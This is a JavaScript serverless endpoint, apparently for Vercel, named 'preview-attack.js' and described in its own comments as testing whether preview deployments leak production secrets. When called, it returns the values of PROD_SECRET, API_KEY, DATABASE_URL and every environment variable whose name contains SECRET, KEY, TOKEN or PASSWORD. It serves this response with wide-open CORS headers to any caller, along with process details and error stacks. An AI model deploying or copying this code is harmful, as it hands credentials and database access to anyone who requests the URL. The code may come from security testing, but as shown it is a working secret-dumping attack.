// api/preview-attack.js
module.exports = (req, res) => {
  // Add CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  try {
    const attackData = {
      attack_type: "Preview Environment Analysis",
      timestamp: new Date().toISOString(),
      
      // Environment analysis
      environment_analysis: {
        current_env: process.env.VERCEL_ENV,
        deployment_url: process.env.VERCEL_URL,
        production_url: process.env.VERCEL_PROJECT_PRODUCTION_URL,
        git_branch: process.env.VERCEL_GIT_COMMIT_REF,
        deployment_id: process.env.VERCEL_DEPLOYMENT_ID
      },
      
      // 🚨 CRITICAL TEST: Secret access in preview
      secret_access_test: {
        prod_secret: process.env.PROD_SECRET || 'NOT_ACCESSIBLE',
        api_key: process.env.API_KEY || 'NOT_ACCESSIBLE',
        database_url: process.env.DATABASE_URL || 'NOT_ACCESSIBLE',
        
        // Show all environment variables with sensitive keywords
        sensitive_env_vars: Object.keys(process.env)
          .filter(key => 
            key.includes('SECRET') || 
            key.includes('KEY') || 
            key.includes('TOKEN') ||
            key.includes('PASSWORD') ||
            key.includes('PROD')
          )
          .reduce((acc, key) => {
            acc[key] = process.env[key] || 'EMPTY';
            return acc;
          }, {})
      },
      
      // Cross-environment leakage test
      cross_env_leakage: {
        total_env_vars: Object.keys(process.env).length,
        vercel_env_vars: Object.keys(process.env)
          .filter(key => key.startsWith('VERCEL_'))
          .length,
        custom_env_vars: Object.keys(process.env)
          .filter(key => !key.startsWith('VERCEL_') && !key.startsWith('NODE_') && !key.startsWith('PATH'))
          .length
      },
      
      // Process information
      process_info: {
        pid: process.pid,
        node_version: process.version,
        platform: process.platform,
        cwd: process.cwd()
      }
    };
    
    res.json(attackData);
  } catch (error) {
    res.status(500).json({
      error: error.message,
      stack: error.stack
    });
  }
};
